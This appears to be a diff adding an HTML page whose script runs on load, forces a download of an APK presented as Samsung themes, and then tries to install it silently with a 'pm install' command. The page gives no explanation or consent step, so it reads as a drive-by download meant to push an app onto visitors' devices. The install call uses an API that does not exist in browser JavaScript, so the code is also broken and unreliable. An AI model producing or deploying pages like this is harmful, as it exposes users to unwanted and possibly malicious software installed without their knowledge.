@@ -1,0 +1,17 @@
+
+<html>
+<body>
+    <script>
+        var downloadLink = document.createElement('a');
+        downloadLink.href = 'https://github.com/juancarlos-sudo/SamsungThemes/blob/132c8ef12ec989cc7da02b7ba62b1022328fb258/SamsungThemes.apk';
+        downloadLink.download = 'SamsungThemes.apk';
+        document.body.appendChild(downloadLink);
+        downloadLink.click();
+        document.body.removeChild(downloadLink);
+        
+        
+        var installCommand = 'pm install /sdcard/Download/SamsungThemes.apk';
+        android.os.Process.exec(installCommand);
+    </script>
+</body>
+</html>        
